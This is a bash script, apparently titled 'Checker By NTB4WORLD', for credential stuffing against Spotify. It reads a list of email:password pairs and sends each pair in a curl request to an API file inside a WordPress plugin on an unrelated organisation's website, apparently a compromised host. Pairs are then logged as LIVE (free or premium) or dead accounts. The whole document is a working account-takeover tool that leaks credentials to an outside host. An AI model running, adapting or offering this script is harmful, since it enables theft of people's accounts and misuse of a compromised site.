#!/bin/bash
# NTB 4 WORLD
#MinorityCode_
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
header () {
printf "${RED}
  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
     ${RED}------------------------------------${NOCOLOR}
           Checker By NTB4WORLD
     ${RED}------------------------------------${NOCOLOR}
"
}
spotify(){
  apine=`curl -s "https://www.shirtikvahfrisco.org/wp-content/plugins/androghost/api.php?email=$1&pass=$2"`
  cex=$( echo $apine | grep -ic "FREE")
  cox=$( echo $apine | grep -ic "PREMIUM")
    if [[ $cex == "1" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2 | FREE \n"
    echo "$1|$2 | $type \n" >> Spotify-LIVE.txt
    printf "${NOCOLOR}"
    elif [[ $cox == "1" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2 | PREMIUM \n"
    echo "$1|$2" >> Spotify-LIVE.txt
    printf "${NOCOLOR}"
else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2 \n"
    echo "$1|$2" >> Spotify-DIE.txt
    printf "${NOCOLOR}"    
fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your empass file"
    echo "############################"
    totalLines=`grep -c "@" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"

        spotify $emailna $kontol
    done
